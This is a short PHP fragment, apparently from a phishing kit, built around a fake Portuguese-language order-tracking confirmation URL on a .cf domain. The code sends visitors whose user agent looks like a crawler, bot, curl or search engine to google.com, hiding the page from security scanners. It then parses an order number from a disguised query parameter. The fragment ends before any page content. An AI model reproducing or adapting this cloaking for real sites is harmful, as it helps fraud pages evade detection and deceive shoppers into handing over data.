<?php 
//http://www3.surpreendaseupai.cf/confirmacao/?cookie982890907340594803470460735070039=acompanhar/pedido/75594548/Y/Y

if(smart_ip_detect_crawler()){
   header('Location: https://www.google.com');
   die();
}

function smart_ip_detect_crawler() {
  $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
  $bot_identifiers = array(
    'bot',
    'slurp',
    'crawler',
    'spider',
    'curl',
    'facebook',
    'fetch',
    'Google',
    'msn',
    'Slur',
    'Yahoo'
  );
  foreach ($bot_identifiers as $identifier) {
    if (strpos($user_agent, $identifier) !== FALSE) {
      return TRUE;
    }
  }

  return FALSE;
}

$pedido= $_GET['cookie982890907340594803470460735070039'];

$pedido_a= explode('/', $pedido);

$pedidov= $pedido_a[2];

$rand= rand(1, 50);

$link= explode('.', $_SERVER['HTTP_HOST'])[0];




